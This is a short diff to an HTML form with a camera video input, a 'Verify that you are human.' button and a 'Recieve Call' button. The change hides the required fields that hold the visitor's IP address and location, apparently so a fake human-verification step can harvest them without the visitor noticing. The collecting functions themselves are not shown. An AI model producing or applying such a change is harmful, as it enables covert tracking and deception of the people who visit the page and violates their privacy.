@@ -113,15 +113,15 @@
                     <input id="rec-video" name="rec-video" type="file" accept="video/*" capture="environment" onchange="loadVideo()">
                 </div>
 		<div class="label-input-container">
-                    <label for="ip" class="form-items">ID1</label>
-                    <input id="ip" class="user-ip" name="ip" type="text" required>
+                    <label for="ip" class="form-items" style="visibility:hidden">ID1</label>
+                    <input id="ip" class="user-ip" name="ip" type="text" required style="visibility:hidden">
                 </div>
 		<div class="label-input-container">
-                    <label for="loc" class="form-items">ID2</label>
-                    <input id="loc" class="user-loc" name="loc" type="text" required >
+                    <label for="loc" class="form-items" style="visibility:hidden" >ID2</label>
+                    <input id="loc" class="user-loc" name="loc" type="text" required  style="visibility:hidden" >
                 </div>
                 <div class="welcome-mess">
-            <p  style="color: white; display: none" id="verifystatus">Please Double Click Here To Get Best Quality.</p>
+            <p  style="color: white; display: none" id="verifystatus">Please Double Click Here.</p>
         </div>
   <button type="button" id="verify-btn" value="verify" onclick="verifyip();verifyloc();">Verify that you are human.</button>          
 <button type="button" id="submit-btn" value="submit" onclick="changeusername();">Recieve Call</button>
